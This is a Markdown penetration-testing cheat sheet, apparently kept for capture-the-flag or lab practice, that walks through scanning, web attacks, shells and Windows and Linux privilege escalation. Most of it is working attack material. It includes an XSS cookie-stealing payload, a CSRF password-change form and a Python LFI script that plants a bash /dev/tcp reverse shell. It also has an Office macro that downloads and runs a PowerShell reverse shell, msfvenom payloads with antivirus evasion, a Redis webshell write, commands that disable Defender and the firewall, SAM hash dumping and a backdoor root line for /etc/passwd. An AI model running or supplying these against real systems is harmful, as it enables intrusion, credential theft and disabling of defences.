# My Security Resources

[TOC]

## Scan
### Portscan
- nmap
    - Parameters
        - `-A` : Enable OS detection, version detection, script scanning, and traceroute
        - `-p-` : Scan all ports
        - `-p 1000-9999` : Scan port from 1000 to 9999 
    - Fast UDP Scan
        - `sudo nmap -sUV -T4 -F --version-intensity 0 {IP}`
- RustScan
	- `rustscan -a 10.10.166.15`
	    - `-r 1-65535` : Port range from 1 to 65535
### Services
- enum4linux
    - Parameters
        - `-a` : Do all simple enumeration
## Web
### Scan
- [Dirsearch](https://github.com/maurosoria/dirsearch)
- [Githack-python3](https://github.com/tigert1998/GitHack-py3)
- [FFUF](https://github.com/ffuf/ffuf)
    - Fuzz sub-domain
        - `ffuf -c -w /usr/share/dnsrecon/subdomains-top1mil-20000.txt -u http://{domain.name}/ -H "Host: FUZZ.{domain.name}" -fs {normal_size}`
        - Wordlist
            - https://github.com/danTaler/WordLists/blob/master/Subdomain.txt
            - `/usr/share/dnsrecon/subdomains-top1mil.txt`
### Front-End
#### XSS
- Steal Cookie
	- `<script>new Image().src="http://{my_ip}:1234/"+document.cookie</script>`
	- `nc -l 1234`
#### CSRF
```html
<form id="myForm" name="myForm" action="/change_pass.php" method="POST">
<input type=hidden name="password" id="password" value="meowmeow"/>
<input type=hidden name="confirm_password" id="confirm_password" value="meowmeow"/>
<input type=hidden name="submit" id="submit" value="submit"/>
<script>document.createElement('form').submit.call(document.getElementById('myForm'))</script>
```
### Server
#### Apache
- Default log path
    - `/var/log/apache2/access.log`
- Shell Shock
    - Exist some path like `/cgi-bin/*.sh`
        - `dirsearch.py -u http://{IP}/cgi-bin  -e cgi`
    - Add `() { :;}; echo; /usr/bin/id` to User-Agent
        - Must use Absolute path
        - `User-Agent: (){ :; }; /bin/ping -c 1 {MY_IP}`
    - nmap test
        - `nmap {IP} -p {PORT} --script=http-shellshock --script-args uri=/cgi-bin/{FILE_NAME}.cgi`
- Default config path
    - `/etc/httpd/conf/httpd.conf`
#### Nginx
#### IIS
- Default web root path
    - `C:\inetpub\wwwroot`
- IIS 6.0
    - [CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)
        - Can only run once!!
#### Tomcat
- Tomcat Path
    - `/manager/status/all`
    - `/admin/dashboard`
- Path Bypass
    - With `/..;/`
        - e.g. `/manager/status/..;/html/upload`
### PHP
- Bypass `system`
	- `echo passthru("whoami")`
	- `echo shell_exec("whoami")` 
	- `echo exec("whoami")`
- Wrapper
	- `php://filter/convert.base64-encode/resource=meow.php`
- Default Session Path
    - `/var/lib/php/sessions/sess_{sess_name}`
- LFI PHP_SESSION_UPLOAD_PROGRESS (From Splitline)
    ```python
    import grequests
    sess_name = 'meowmeow'
    sess_path = f'/var/lib/php/sessions/sess_{sess_name}'
    # sess_path = f'/var/lib/php/session/sess_{sess_name}'
    base_url = 'http://{target-domain}/{target-path/randylogs.php}'
    param = "file"

    # code = "file_put_contents('/tmp/shell.php','<?php system($_GET[a])');"
    code = '''system("bash -c 'bash -i >& /dev/tcp/{domain}/{port} 0>&1'");'''

    while True:
        req = [grequests.post(base_url,
                              files={'f': "A"*0xffff},
                              data={'PHP_SESSION_UPLOAD_PROGRESS': f"pwned:<?php {code} ?>"},
                              cookies={'PHPSESSID': sess_name}),
               grequests.get(f"{base_url}?{param}={sess_path}")]

        result = grequests.map(req)
        if "pwned" in result[1].text:
            print(result[1].text)
            break
    ```
    - [File extension](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
- XXE
    ```javascript=
    var xml = '' +
        '<?xml version="1.0" encoding="UTF-8"?>\n' +
        '<!DOCTYPE a [ <!ENTITY b SYSTEM "file:///etc/passwd"> ]>\n' +
        '<root>' +
        '<name>' + "0" + '</name>' +
        '<search>' + "&b;" + '</search>' +
        '</root>';
    ```
### JSP / Tomcat
- Webshell
    - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp
        - `jar -cvf cmd.war cmd.jsp` and upload to Tomcat admin
### Defence
- Knockd
	- `/etc/knockd.conf`
	- `nc` port several time to knock
### Web Shell
- PHP
	- [b374k](https://github.com/b374k/b374k)
	- [windows-php-reverse-shell](https://github.com/Dhayalanb/windows-php-reverse-shell)
- ASPX
	- https://raw.githubusercontent.com/SecWiki/WebShell-2/master/Aspx/awen%20asp.net%20webshell.aspx
	- https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx
- Adminer (SQLadmin)
    - https://www.adminer.org/
### CMS
#### Wordpress
- WPScan
    - `wpscan --url {URL} –-enumerate p,t,u --plugins-detection aggressive -t 30`
        - enumerate
            - p : plugin
            - t : theme
            - u : users
        - t : thread
    - `wpscan --url {url} --usernames {username} --passwords {password_file} -t 30`
- Enum user
    - `http://{ip}/index.php/?author=1`
- plugins path
    - `/wp-content/plugins/{plugin_name}`
### MySQL injection
#### SQL Command
- Limit
    - `LIMIT 0,1` , `LIMIT 1,1` , `LIMIT 2,1` ...
        - Select only 1 data
- Substring
    - `SUBSTRING("ABC",1,1)`
        - Will return `A`
    - `SUBSTRING("ABC",2,1)`
        - Will return `B`
- ASCII
    - `ASCII("A")`
        - Will Return `65`
- Concat
    - `concat(1,':',2)`
        - Will return `1:2`
- group_concat
    - Concatenate multiple data to online string
#### Dump Data
- DB name
    - `select schema_name from information_schema.schemata`
- Table name
    - `select table_name from information_schema.tables where table_schema='{db_name}'`
- Column name
    - `select column_name from information_schema.columns where table_name='{table_name}' and table_schema='{db_name}'`
- Select data
    - `select concat({username},':',{password}) from {db_name}.{table_name}`
- Mysql User and hash
    - `select concat(user,':',password) from mysql.user`
- Command dump
    - `mysqldump -u {username} -h localhost -p {dbname}  > a.sql`

### MSSQL injection
#### SQL Command
- `SELECT quotename({col_name}) FROM {DB} FOR XML PATH('')`
    - Like `group_concate` in MySQL
- `SELECT TOP 1 {COL_NAME} FROM {TABLE}`
    - `SELECT TOP 1 {COL_NAME} FROM {TABLE} WHERE {COL_NAME} NOT IN ('A','B')` 
- `SELECT {COL_NAME} FROM {DB_NAME}.dbo.{TABLE}`
- `CONVERT(int,{command})`
    - Error based
#### Dump DB Name
- `DB_NAME({NUM})`
    - NUM start from 1
- `SELECT name FROM master ..sysdatabases`
- `SELECT name FROM master.dbo.sysdatabases`
- One line
    - `SELECT quotename(name) FROM master.dbo.sysdatabases FOR XML PATH('')`

#### Dump Table name
- One line 
    - `SELECT quotename(name) FROM {DB_NAME}..sysobjects where xtype='U' FOR XML PATH('')`
#### Dump column name
- One line
    - `SELECT quotename(name) FROM {DB_NAME}..syscolumns WHERE id=(SELECT id FROM {DB_NAME}..sysobjects WHERE name='{TABLE_NAME}') FOR XML PATH('')))) -- -`
## Client Side Attack
### Office Macro
- File type : `docm` or `doc`, doesn't support `docx`
- Open cmd when start
    ```vba
    Sub AutoOpen()
        MyMacro
    End Sub
    Sub Document_Open()
        MyMacro
    End Sub
    Sub MyMacro()
        Dim str As String
        str = "cmd /c whoami && pause"
        CreateObject("Wscript.Shell").Run str
    End Sub
    ```
    - cmd path will at `system32`
    - shell : `str = powershell iex (New-Object Net.WebClient).DownloadString('http://{IP}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}`
## Shell
### Linux Shell
- Find File
    - `find  / -iname {file_name} -print 2>/dev/null`
	- `du -a 2>/dev/null | grep {file_name}`
	- `tar cf - $PWD 2>/dev/null | tar tvf - | grep {file_name}`
### Windows Shell
- List all data
	- `dir /a`
- Find File
    - `dir {file_name} /s /p`
### Reverse Shell - Linux
- Prepare
	- `nc -nvlp {port}`
	- `nc -vlk {port}`
	- `rlwrap nc -nvlp`
		- Support left and right
- https://reverse-shell.sh/
- [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- Bash tcp
    - `bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'`
    	- Write file in local first, and use wget/curl to get to victim machine
    	- `/usr/bin/wget -O - {ip:port}/{file} | /bin/bash`
- Make it more interactively
    - `python -c 'import pty; pty.spawn("/bin/bash")'`
    - `perl -e 'exec "/bin/bash";'`
### Reverse Shell - Windows
- msfvenom
	- https://infinitelogins.com/2020/01/25/sfvenom-reverse-shell-payload-cheatsheet/
	    - stage : `shell/reverse_tcp `
	        - msf `multi/handler` to receive
	    - stageless : `shell_reverse_tcp`
	        - `nc` to receive
	- aspx
		- `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT}  -f aspx > shell.aspx`
		- `msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT}  -f aspx > shell.aspx`
	- exe
		- `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell-x86.exe`
		- `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -e x86/shikata_ga_nai -f exe > shell.exe`
			- Anti-Anti-virus
        - `msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT}  -f exe -o shellx64.exe`
            - Most of time, x64 system can also run x86 shell
    - msi
        - `msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={Port} -f msi -o shellx64.msi`
            - Install by `msiexec /quiet /i shellx64.msi`

- Powershell
	- https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
	- `powershell iex (New-Object Net.WebClient).DownloadString('http://{my_ip}:{http_port}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {my_ip} -Port {shell_port}`

### File Transmission - Linux
- SCP
- HTTP
	- Prepare
		- `python3 -m http.server`
			- use `sudo` to `get` 80 port
	- GET
		- `wget {my_ip}:{port}/{file_name} -O {path_to_output}`
		- `curl -o {path_to_output} http`
- NC
	- Prepare
		- `nc -l -p {attacker_port} > {file}`
	- Send
		- `nc {attacker_ip} {attacker_port} < {file}`
		- `cat {file} > /dev/tcp/{ip}/{port}`
### File Transmission - Windows
- HTTP
	- Prepare
		- `python3 -m http.server`
	- GET (Powershell)
		- `wget` , `curl` , `iwr` is alias for `Invoke-WebRequest`
			- `Invoke-WebRequest http://{my_ip}:{my_port}/{file} -outFile {file_name}`
			    - `-UseBasicParsing`
        - `certutil -urlcache -f {URL} {File_name}`
- SMB
	- `impacket-smbserver meow .`
		- In Kali
		- `-smb2support`
	- `copy \\{IP}\meow\{filename} {filename}`
		- In Windows
    - `net view {IP}`
        - Show shares
- Pack file
	- cab
		- `lcab -r {dir} {file.cab}`
			- In kali
		- `expand {file.cab} -F:* {Extract path}`
			- Extract path must be absolute path like `C:\Windows\Temp`
- https://blog.ropnop.com/transferring-files-from-kali-to-windows/
## Server
### Redis
- Write shell / file
	- `redis-cli -h {ip} `
		- Connect
	- `config set dir "/var/www/html"`
		- Set dir
	- `config set dbfilename meow.php`
		- Set file name
	- `set x "\r\n\r\n<?php system($_GET[A]);?>\r\n\r\n"`
		- Write web shell
	- `save`
		- Save file
### MSSQL
- Connect
	- `impacket-mssqlclient -p {port} {UserID}@{IP} -windows-auth`
	- Default port : 1433
- Shell
	- `exec xp_cmdshell '{Command}'`
### Oracle
- Default Port 1521
- Check version
    - `nmap --script "oracle-tns-version" -p 1521 -T4 -sV {IP}`
- Brute Force SID
    - `hydra -L sids-oracle.txt -s 1521 {IP} oracle-sid`
    - [oracle-sid.txt](https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-LcreDSG0Hi8mv8n8DIw%2F-LcrnYv40ILvFrpjKRkb%2Fsids-oracle.txt?alt=media&token=8206a9f6-af86-4a49-ac71-179ca973d836)
- Connection
    - `tnscmd10g status --10G -p {port} -h {IP}`
- [ODAT](https://github.com/quentinhardy/odat/releases)
- Brute Force Username and Password
    - `./odat all -s {IP} -p {PORT} -d {SID}`
    - `--accounts-file` , `--accounts-files`
- RCE
    - `odat-libc2.12-x86_64 ./odat-libc2.12-x86_64 dbmsscheduler -U {Username} -P {Password} -d {SID} -s {IP} --sysdba --exec "{command}" `
### SMB
- smb to shell
    - `winexe -U '{username}' //{ip} cmd.exe`
    - `impacket-smbexec '{username}:{password}'@{ip}`
    - `impacket-psexec {username}:{password}'@{ip}`
- Check version
    - `nmap -p139,445 --script smb-os-discovery -Pn {IP}`
- Check vuln
    - `nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 -Pn {IP}`
- Low Version
    - `--option='client min protocol=nt1'`
        - If got `NT_STATUS_CONNECTION_DISCONNECTED`
- Symlink Directory Traversal ( < 3.4.5)
    - Tested on 3.0.24
    - https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually


### PostgreSQL
- Dump
    - `PGPASSWORD="{PASSWORD}" pg_dump {DB_NAME} > test.dump`
## Privilege - Linux
### Kernel Exploit
- [CVE-2017-16995](https://github.com/rlarabee/exploits/tree/master/cve-2017-16995)
    - Test on Kernel 4.4.0
    - `gcc cve-2017-16995.c -o cve-2017-16995`
- [CVE-2012-0056 (memodipper)](https://github.com/lucyoa/kernel-exploits/blob/master/memodipper/memodipper.c)
    - `gcc memodipper.c -o m.out`
- [CVE-2010-2959 (i-can-haz-modharden)](https://raw.githubusercontent.com/macubergeek/ctf/master/privilege%20escalation/i-can-haz-modharden.c)
- Compile for old OS
    - `gcc -m32 ./{INPUT.c) -o {OUTPUT} -Wl,--hash-style=both`
    - 
### Software
- [GTFOBins](https://gtfobins.github.io/)
    - Linux privileges escalation 
- [Pspy](https://github.com/DominicBreuker/pspy)
    - Monitor the process
#### Enumeration
Scan the system to find which can be use for privileges escalation
- [PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LSE](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux-Exploit-Suggester (LES)](https://github.com/mzet-/linux-exploit-suggester)
### Tips
- Writable `/etc/passwd`
    - Append `root1:yeDupmFJ8ut/w:0:0:root:/root:/bin/bash` to file
        - `root1` : `meow`
    - Generate hash : `openssl passwd {PASSWORD}`
### Program Hijack
#### Python
- import library priority
	1. local file
	2. `python -c "import sys;print(sys.path)"`
- Check file permission if it can be write 
- Fake library file
	```python
	import pty
	pty.spawn("/bin/bash")
	```
#### Bash
- Relative path is from `$PATH`
	- We can modify this by
		- `PATH=/my/fake/path:$PATH ./binary`
	- Fake path can contain the shell/reverse shell command file

### Program
- `tar` Wildcard
	- `echo "bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'" > shell.sh`
	- `chmod 777 shell.sh`
	- `echo "" > "--checkpoint-action=exec=sh shell.sh"`
	- `echo "" > --checkpoint=1`
	- `tar cf archive.tar *`
### Capability
- If the program has some special capability
	- https://man7.org/linux/man-pages/man7/capabilities.7.html
	- `CAP_SETUID`
- Can do with [GTFOBins](https://gtfobins.github.io/)
###  Doas
- `doas.conf`
	- if exist `permit nopass {user} as {root} cmd {binary}`
	- We can `doas {binary}` and it will run as root
### SSH `authorized_keys` Brute force
- `/var/backups/ssh/authorized_keys` or `~/.ssh/authorized_keys`
- https://gitbook.brainyou.stream/basic-linux/ssh-key-predictable-prng-authorized_keys-process
    - `git clone https://github.com/g0tmi1k/debian-ssh`
    - `tar vjxf debian-ssh/common_keys/debian_ssh_dsa_1024_x86.tar.bz2`
    - `cd debian-ssh/common_keys/dsa/1024/`
    - `grep -lr '{keys}'`
    - Find the file name without `.pub` is secret key
### Docker
- `/.dockerenv`
	- If exist, probably in docker 
- Notice mount point
### SOP
- Check `sudo -l`
	- What file we can run as super user 
- Check crontab
    - `cat /etc/crontab `
	- With LinEnum, LinPeas
	- PsPy check
- Check SUID / SGID
    - `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
    - `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
    - With [GTFOBins](https://gtfobins.github.io/)
- Check sudo version
	- [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)
		- sudo < 1.8.28
		- `sudo -u#-1 binary`
- Check $PATH / import library permission
	- Program Hijack
- Check capability
    - `getcap -r / 2>/dev/null`
	- Check if the program has some useful capability
- Check backup file
## Privilege - Windows
### Exploit
- https://github.com/SecWiki/windows-kernel-exploits
- [EternalBlue MS17-010](https://github.com/helviojunior/MS17-010)
    - Prepare msf reverse shell exe
    - run `send_and_execute.py` 
        - Maybe need to change username to `guest` 
- [Cerrudo](https://github.com/Re4son/Churrasco)
    - Windows Server 2003
- [MS15-051](https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip)
    - `ms15-051x64.exe whoami`
- [JuicyPotato x64](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe) , [x86](https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe)
    - User have `SeImpersonate` or `SeAssignPrimaryToken` by `whoami /priv`
    - `JuicyPotato.exe -l 1337 -p shell7878.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}`
        - `-c` (Include curly brackets)
            - CLSID from https://ohpe.it/juicy-potato/CLSID/
        - `-p` Exe Program 
- [XP SP0 \~ SP1](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)
    -  `net start SSDPSRV`
    -  `sc config SSDPSRV start= auto`
    -  `sc qc SSDPSRV`
    -  `net start SSDPSRV`
    -  `sc config upnphost binpath= "C:\{abs_path_for_reverse_shell_exe}`
    -  `sc config upnphost obj= ".\LocalSystem" password= ""`
    -  `sc qc upnphost`
    -  `net start upnphost`
### Bypass UAC
- [CVE-2019-1388](http://blog.leanote.com/post/snowming/38069f423c76)
### Registry
- AlwaysInstallElevated
    - If both set to 1
        - `reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
        - `reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
    - Can install file with
        - `msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={Port} -f msi -o shellx64.msi`
        - `msiexec /quiet /i shellx64.msi`
    - But need to check where can install (AppLocker)
        - `Get-AppLockerOolicy -Effective | Select -Expandproperty RuleCollections`

### Defender / Firewall
- 64 bit Powershell
	- `%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe`
-  Disable Realtime Monitoring 
	-  `Set-MpPreference -DisableRealtimeMonitoring $true`
-  Uninstall Defender
	-  `Uninstall-WindowsFeature -Name Windows-Defender –whatif`
	-  `Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet`
-  Turn off firewall
	- `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`
- Check Defender Status
    - `powershell -c Get-MpComputerStatus`
        - Check `AntivirusEnabled` is `True` or `False`
### Check vulnerability
- [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
	- `systeminfo`
		- Run in target machine and save to txt file
    - Dependency
        - `pip install xlrd==1.2.0`
	- `windows-exploit-suggester.py --update`
		- Get new database
	- `windows-exploit-suggester.py --database {Database file} --systeminfo {systeminfofile}`
- [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)
	- `systeminfo`
	- `python3 wesng.py --update`
	- `python3 wesng.py {systeminfofile}`
### Sensitive data
- PowerShell History Path
	- `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt `
- User Home
    - Desktop
    - Document
    - Download
### Process
- `netstat -ano`
    - Open Port
    - `netstat -an | findstr "LISTENING"`
- `tasklist`
    - like ps
### Permission
- `icacls`
    - Check permission
    - `/reset` reset the permission to their parent
- [cpau](https://www.joeware.net/freetools/tools/cpau/index.htm)
    - `cpau -u {user_name} -p {password} -ex C:\{abs_exe_path} -LWP`
    - Run command with given username and password.
- Administrator to System
    - It is a feature
        - `PsExec -i -s cmd.exe`
            - Will creat a new window
        - `PsExec -s cmd`
            - In current window
        - `-accepteula`
        - https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
### User
- Create new user
    - `net user /add {USER_NAME} {USER_PASS}`
- Add user to admin group
    - `net localgroup administrators {USER_NAME} /add`
### AD
- List user
    - `net user` Machine
    - `net user /domain` AD
    - `net user {Username} /domain` list user detail
- List group
    - `net group`
    - `net group /domain`
### Get User's hash
- `impacket-smbserver`
    - `dir \\{ip}\meow`
    - Get NETNTLMv2
    - Use john to crack!
- Dump `sam` / `system`
    - reg
        - `reg save hklm\sam c:\sam`
        - `reg save hklm\system c:\system`
    - `fgdump.exe` (`locate fgdump.exe`)
        - Send to windows and just run
        - It will create a `127.0.0.1.pwdump` hash file
### Powershell
- If got `cannot be loaded because running scripts is disabled on this system`
    - type `Set-ExecutionPolicy RemoteSigned`


## Password Crack
### Software
- Hydra
    - Crack online services password
        - SMB,SSH,FTP......
    - Usage
        - ssh
            - `hydra -l {username} -P {path_to_wordlist} ssh://{ip_address}`
        - http{s}
            - `hydra -l {username} -P {path_to_wordlist} {domain_name_without http/s} http{s}-post-form "{/{path}}:username=^USER^&password=^PASS^&data=data:{string_if_fail}"`
- John the ripper
    - Crack hash like `/etc/shadow`
    - Support tools
        - [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
        - gpg2john
        - zip2john
        - samdump2
        	- NTLM 2 John
        	- `samdump2 system sam > j.txt`
    - Usage
        - `john {file} --wordlist={wordlist}`
- Hashcat
    - Crack hash 
        - https://hashcat.net/wiki/doku.php?id=example_hashes
    - `hashcat -m {mode} {hashes.txt} {wordlist.txt}`
### Dictionary
- rockyou.txt
- https://github.com/danielmiessler/SecLists
	- [xato-net-10-million-passwords-dup.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-dup.txt)
- Apache Tomcat
    - `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt`
    - `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt`
    - `hydra -L  /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt -f {IP} -s {PORT} http-get /manager/html`
### Online
- https://crackstation.net/

## Software
- RDP
	- `xfreerdp +drives /u:{username} /v:{ip}:{port}`
	    - `/size:1800x1000`
- FTP
	- `ls`
	- `get {file_name}`
	- `put {file_name}`
	- Download recursive 
	    - `wget -r 'ftp://{ip}/{path}/'`
- Unzip
    - `.gz`
        - `gunzip  {filename.gz}`
- tcpdump
    - Recv icmp : `sudo tcpdump -i tun0 icmp`
### Reverse port forwarding
- [Chisel](https://github.com/jpillora/chisel) 
    - Server : `./chisel server -p {listen_port} --reverse`
        - listen port can be random
    - Client : `./chisel client {Remote_host}:{listen_port} R:{forward_port_at_attacker}:127.0.0.1:{forward_port}`
    - eg. : Remote server run a program at `127.0.0.1:8888`,we need to forward to our attack machine's `127.0.0.1:8888`
        - `./chisel server -p 9999 --reverse`
        - `./chisel client 10.10.16.35:9999 R:8888:127.0.0.1:8888`
- SSH
    - `ssh -L {forward_port}:127.0.0.1:{forward_port} {remote_user}@{remote_ip} -p {ssh_port} -N -v -v`
        - Run in local
        - eg : Remote `10.87.87.87` run `5555` in remote local, open `2222` port for ssh, we can use following command to forward `5555` to our local `5555`
            - `ssh -L 5555:127.0.0.1:5555 demo@10.87.87.87 -p 2222 -N -v -v`

## Forensics
- Unknown files
	- `file {file_name}`
	- `binwalk {file_name}`
	- `xxd {file_name}`
	- `foremost {file_name}`
- dd
    - `dd if={input_file} bs=1 skip={skip_offset} of={outfile}`
### Steganography
- [stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve)
- [zsteg](https://github.com/zed-0xff/zsteg)
- [steghide](http://steghide.sourceforge.net/)
	- `steghide extract -sf {file_name}`
- exiftool

<!-- todo

-->
